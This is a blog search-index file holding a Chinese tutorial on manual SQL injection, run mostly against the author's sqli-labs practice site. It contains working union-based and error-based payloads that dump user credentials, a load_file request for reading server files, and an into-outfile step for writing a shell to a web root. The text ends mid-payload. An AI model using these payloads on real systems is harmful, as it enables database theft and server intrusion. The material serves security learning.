<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="posts/530fceb2/"/>
      <url>posts/530fceb2/</url>
      
        <content type="html"><![CDATA[<h2 id="access-asp-手工注入">access+asp 手工注入</h2><hr><h4 id="access-数据库">access 数据库</h4><hr><p>access 数据库与其他数据库不一样 他没有存储表的库，所以只能猜表。</p><h4 id="access-数据库结构">access 数据库结构</h4><p>表 字段 数据</p><h4 id="判断是否存在注入">判断是否存在注入</h4><ul><li><p>and 判断</p></li><li><p>and 1=1  正确页面</p></li><li><p>and 1=2 错误页面</p></li><li><p>or 判断</p></li><li><p>or 1=1 正确页面</p></li><li><p>or 1=2 错误页面</p></li></ul><h4 id="判断字段数">判断字段数</h4><p>order by 判断当前表 的字段数</p><ul><li><p>order by 10 正常</p></li><li><p>order by 11 错误</p></li></ul><p>所以有10个字段</p><h4 id="猜表">猜表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><h4 id="猜字段">猜字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,id,username,password,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><hr><h3 id="逐字猜解法">逐字猜解法</h3><hr><h4 id="判断注入">判断注入</h4><ul><li><p>and 1=1</p></li><li><p>and 1=2</p></li></ul><h4 id="猜表-2">猜表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from admin)</span><br></pre></td></tr></table></figure><p>页面返回正常说明表存在</p><h4 id="猜列">猜列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select username from admin)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists (select password from admin)</span><br></pre></td></tr></table></figure><h4 id="猜数据长度">猜数据长度</h4><ul><li>len() 函数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 len(username) from  admin)&#x3D;8</span><br></pre></td></tr></table></figure><p>等于 8 就是确定数据的长度 也可以使用大于（&gt;）小于（&lt;）个人认为 等于（=）最 好确定长度</p><p>查询数据 asccii 码</p><ul><li><p>mid() 截取位置</p></li><li><p>asc() ascii 码</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(username,1,1)) </span><br><span class="line">from admin)&#x3D;97</span><br><span class="line">and (select top 1 asc(mid(username,2,1)) </span><br><span class="line">from admin)&#x3D;100</span><br></pre></td></tr></table></figure><p>猜解完之后 把 ascii 码 转换过来 并接 就是 username 字段的的数据，其他字段也是这 样。 97 的字符为 a 100 的字符为 d 并接起来就是 ad</p><hr><h3 id="SQL-注入类型的区分详解">SQL 注入类型的区分详解</h3><hr><h4 id="首先按照常用接收方式的不同可以分为以下三种">首先按照常用接收方式的不同可以分为以下三种</h4><ul><li>GET</li></ul><p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p><p>[URL 最长的长度][<a href="https://www.cnblogs.com/cuihongyu3503319/p/5892257.html">https://www.cnblogs.com/cuihongyu3503319/p/5892257.html</a>]</p><ul><li>POST</li></ul><p>POST 请求参数是放在请求 body 里的，长度没有限制</p><ul><li>COOKIE</li></ul><p>cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取参数。</p><h4 id="注入数据类型的区分">注入数据类型的区分</h4><ul><li>int 整型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id&#x3D;1</span><br></pre></td></tr></table></figure><ul><li>string 字符型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure><ul><li>like 搜索型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#39;%标题%&#39;</span><br></pre></td></tr></table></figure><p>以上 除了第一种以外 其余在判断注入或查询语句的时候都要进行闭合，不闭合 SQL 语句不仅会出错，可能与原意不一样，会造成错误的判断</p><ul><li>字符型 注入闭合</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;admin&#39; and &#39;x&#39;&#x3D;&#39;x&#39;</span><br></pre></td></tr></table></figure><p>’ and ‘x’='x 这个部分就是闭合的部分</p><ul><li>like 模糊型注入闭合</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#39;%标题%&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#39;%标题%&#39; and &#39;1%&#39; &#x3D; &#39;1%&#39;</span><br></pre></td></tr></table></figure><p>%’ and ‘1%’ = '1 这个是闭合的部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where title like &#39;%s%&#39; and &#39;1%&#39; &#x3D; &#39;1%&#39;</span><br></pre></td></tr></table></figure><h4 id="注入方法区分">注入方法区分</h4><p>联合查询注入 union select 联合两个表</p><p>报错注入 数据库报错信息 进行注入</p><p>盲注入</p><ul><li>布尔型注入</li><li>时间型注入</li></ul><hr><h2 id="mysql-php-手工注入篇">mysql+php 手工注入篇</h2><hr><h3 id="mysql-的注释符号">mysql 的注释符号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--空格</span><br><span class="line">&#x2F;*里面注释*&#x2F;</span><br></pre></td></tr></table></figure><p>用于注释后后面语句 不再执行</p><h3 id="注入常用查询系统信息函数">注入常用查询系统信息函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">version()   MYSQL版本</span><br><span class="line"><span class="built_in">system_user</span>() 系统用户名</span><br><span class="line"><span class="keyword">user</span>()数据库用户名</span><br><span class="line"><span class="built_in">current_user</span> 当前用户名</span><br><span class="line"><span class="built_in">session_user</span>()连接数据库的用户名</span><br><span class="line">database()数据库名</span><br><span class="line">@<span class="variable">@datadir</span>数据库路径</span><br><span class="line">@<span class="variable">@basedir</span> MYSQL 安装路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os操作系统版本</span><br><span class="line">load_file() MYSQL 读取本地文件的函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="判断是否存在注入-2">判断是否存在注入</h4><p>页面是否返回正常，或是否存在报错信息</p><ul><li><p>and 1=1 正常</p></li><li><p>and 1=2 错误</p></li><li><p>&amp;&amp; 1=1 正常</p></li><li><p>&amp;&amp; 1=2 错误</p></li><li><p>or 1=1</p></li><li><p>or 1=2</p></li></ul><h4 id="判断列数">判断列数</h4><p>与其他数据库一样 order by 进行排列获取字段数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144238.png" alt="image-20210526144229580"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144259.png" alt="image-20210526144253091"></p><p>order by 3 页面正常 order by 4 页面返回空白 或者文章没有显示出来，列数为 3 个</p><p>mysql 与 access 数据库不一样。在没有表名的前提下也可以查询数据库一些信息，如安装路径、 库名、操作系统信息</p><h4 id="联合查询-union-select">联合查询 union select</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,3 -- qwe</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;1&#39;  and 1&#x3D;2 union select 1,2,3 -- qwe</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39;  and 1&#x3D;1 union select 1,2,3 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526144850.png" alt="image-20210526144843542"></p><p>以上三个语句的意思都是相同的 前面获取数据为 null 将会显示后面的数字</p><h4 id="查询库名">查询库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,database() -- qwe</span><br></pre></td></tr></table></figure><p>/<em>查询所有库</em>/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,group_concat(schema_name) from information_schema.schemata -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526145550.png" alt="image-20210526145543573"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526150858.png" alt="image-20210526150851830"></p><h4 id="查询表名">查询表名</h4><p>mysql 里面有一个库 information_schema 里面存在很多信息，其中包括所有的库名， 表名， 字段名。因此可以利用这个库来获取当前库的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema&#x3D;&#39;security&#39; -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526150757.png" alt="image-20210526150751007"></p><p>group_concat()  连接所有非 NULL 的字符串</p><ul><li><p>limit 1,1 获取第一个</p></li><li><p>limit 2,1 获取第二个</p></li></ul><h4 id="查询字段">查询字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,group_concat(column_name)  from information_schema.columns where table_name&#x3D;&#39;users&#39; -- qwe</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,group_concat(column_name)  from information_schema.columns where table_name&#x3D;0x7573657273 -- qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526151629.png" alt="image-20210526151623218"></p><h4 id="查询数据">查询数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-1&#x2F;?id&#x3D;&#39; -1  union select 1,2,group_concat(0x3c2f62723e,id,0x7e,username,0x7e,password)  from users -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526152328.png" alt="image-20210526152321286"></p><h4 id="查询失败的原因">查询失败的原因</h4><p>这种方面不是通用的，有时候 查询不全 这个原因是字段的大小问题。解决办法 换一 个字段查询，或者 用函数查询长度再用字符串函数截取</p><h4 id="读写操作">读写操作</h4><p>MYSQL 新特性 secure_file_priv 对读写文件的影响 此开关默认为 NULL，即不允许导入导出。</p><p>secure_file_priv 为空是 的时候 方可读写 由于这个参数不能动态更改，只能在 mysql 的配置文 件中进行修改，然后重启生效。 可以通过命令查看这个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv</span><br></pre></td></tr></table></figure><p>secure_file_priv 为 null 表示不允许导入导出</p><p>secure_file_priv 指定文件夹时，表示 mysql 的导入导出只能发生在指定的文件夹</p><p>secure_file_priv 没有设置时，则表示没有任何限制</p><p>写入文件的时候还需要看 php.ini 里面 gpc 是否开启 开启的情况下 特殊字符都会被转义 ’ 变成  ’</p><p>load_file()读取文件函数</p><p>读取当前目录下的 index.php 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;target_sys.com&#x2F;article.php?id&#x3D;-1 union select  1,2,load_file(&#39;C:\\inetpub\\wwwroot\\target_sys.com\\index.php&#39;)</span><br></pre></td></tr></table></figure><ul><li><p>into outfile 文件导出 空格</p></li><li><p>into dumpfile 没有空格</p></li></ul><p>1、gpc 关闭</p><p>2、目录可写</p><p>写 shell 话到当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;target_sys.com&#x2F;article.php?id&#x3D;-1 union select 1,&#39;&#39;,3 into outfile  &#39;C:\\inetpub\\wwwroot\\target_sys.com\\smoon.php&#39;</span><br></pre></td></tr></table></figure><hr><h3 id="报错注入">报错注入</h3><hr><p>mysql 在执行 SQL 语句的时 如果语句有错 会返回报错信息，在与 php 结合使用的时候默认并 不会把报错的信息在页面显示出来</p><p>如果要在 php 显示出来 将在执行语句的时候使用 mysql_error() 才可以把错误的信息 显示到页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span>=mysql_query(<span class="string">&quot;select * from article where id=<span class="subst">$id</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br></pre></td></tr></table></figure><h4 id="判断注入-2">判断注入</h4><ul><li>and 1=1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526154023.png" alt="image-20210526154017081"></p><ul><li>and 1=2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 -- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526154046.png" alt="image-20210526154040880"></p><h4 id="报错语句">报错语句</h4><h5 id="通过-floor-报错">通过 floor 报错</h5><ul><li>/<em>数据库版本</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))  from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables  group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) </span><br><span class="line">from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526192844.png" alt="image-20210526192837729"></p><ul><li>/<em>连接用户</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e)))  from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables  group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) </span><br><span class="line">from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193002.png" alt="image-20210526192956089"></p><ul><li>/<em>连接数据库</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (select  concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (select </span><br><span class="line">concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x </span><br><span class="line">from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193109.png" alt="image-20210526193102897"></p><ul><li>/<em>暴库</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193613.png" alt="image-20210526193607574"></p><ul><li>/<em>暴表</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct  concat(0x7e,table_name,0x7e) FROM information_schema.tables where  table_schema&#x3D;database() LIMIT 0,1)) from information_schema.tables limit  0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,table_name,0x7e) FROM information_schema.tables where </span><br><span class="line">table_schema&#x3D;database() LIMIT 0,1)) from information_schema.tables limit </span><br><span class="line">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193914.png" alt="image-20210526193908156"></p><ul><li>limit 3,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526193946.png" alt="image-20210526193940169"></p><ul><li>/<em>暴字段</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct  concat(0x7e,column_name,0x7e) FROM information_schema.columns where  table_name&#x3D;0x7573657273 LIMIT 0,1)) from information_schema.tables limit  0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x7e,column_name,0x7e) FROM information_schema.columns where </span><br><span class="line">table_name&#x3D;0x7573657273 LIMIT 0,1)) from information_schema.tables limit </span><br><span class="line">0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194225.png" alt="image-20210526194219860"></p><ul><li>limit 1,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194259.png" alt="image-20210526194253727"></p><ul><li>limit 2,1</li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194315.png" alt=""></p><ul><li>/<em>暴内容</em>/</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables&#96; </span><br><span class="line">&#96;group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select 1 from(select count(*),concat((select (select (SELECT distinct </span><br><span class="line">concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)) from </span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables </span><br><span class="line">group by x)a)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194601.png" alt="image-20210526194555411"></p><h5 id="ExtractValue-有长度限制-最长-32-位">ExtractValue(有长度限制,最长 32 位)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526194803.png" alt="image-20210526194757272"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23) FROM users limit 0,1)))-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195009.png" alt="image-20210526195003480"></p><h5 id="UpdateXml-有长度限制-最长-32-位">UpdateXml(有长度限制,最长 32 位)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195113.png" alt="image-20210526194757272"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23)  FROM users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,id,0x23,username,0x3a,password,0x23)  FROM users limit 0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526195009.png" alt="image-20210526195003480"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(SELECT distinct  LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(SELECT distinct </span><br><span class="line">LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM users limit 0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526201802.png" alt="image-20210526201756403"></p><p>查询长度为11</p><p>SUBSTRING()字符串截取函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(SELECT distinct </span><br><span class="line">SUBSTRING(concat(0x23,username,0x3a,password,0x23),1,11) FROM users limit </span><br><span class="line">0,1),0x7e),1)-- qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526202020.png" alt="image-20210526202013669"></p><h5 id="NAME-CONST-适用于低版本">NAME_CONST(适用于低版本)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and+1&#x3D;(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as +x)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.dansemal.cn&#x2F;Less-5&#x2F;?id&#x3D;1&#39; 